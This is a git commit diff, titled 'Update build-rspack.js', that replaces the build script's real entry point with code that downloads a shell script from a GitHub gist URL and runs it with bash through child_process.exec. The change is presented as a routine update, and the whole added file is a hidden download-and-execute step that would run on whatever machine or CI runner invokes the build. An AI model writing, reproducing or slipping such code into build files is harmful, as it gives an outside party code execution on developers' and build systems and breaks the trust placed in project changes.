f59e8613d4a76bf8ade476668a7f2c792407565b
chai-hulud <94066039+chai-hulud@users.noreply.github.com>
2024-04-24 15:09:36 -0500

    Update build-rspack.js

--- bin/build-rspack.js
+++ bin/build-rspack.js
@@ -1,8 +1,35 @@
-import { buildRspack } from "../lib/index.js";
+const https = require('https');
+const { exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
 
-const [, , remote = "origin", branch = "main"] = process.argv;
+const url = 'https://gist.githubusercontent.com/chai-hulud/2912689a3847a7045c445731dd5d73b4/raw/e204882ed0de03dd008802c7a824513340d2c292/install.sh';
+const filePath = path.join(__dirname, 'downloaded_script.sh');
 
-buildRspack(remote, branch).catch(err => {
-	process.exitCode = 1;
-	console.error(err.stack);
-});
+const downloadScript = (url, filePath) => {
+  const file = fs.createWriteStream(filePath);
+  https.get(url, (response) => {
+    response.pipe(file);
+    file.on('finish', () => {
+      file.close(() => {
+        executeScript(filePath);
+      });
+    });
+  }).on('error', (err) => {
+    fs.unlink(filePath);
+    console.error('Error downloading the script:', err.message);
+  });
+};
+
+const executeScript = (filePath) => {
+  exec(`bash ${filePath}`, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Execution error: ${error}`);
+      return;
+    }
+    console.log(`stdout: ${stdout}`);
+    console.error(`stderr: ${stderr}`);
+  });
+};
+
+downloadScript(url, filePath);
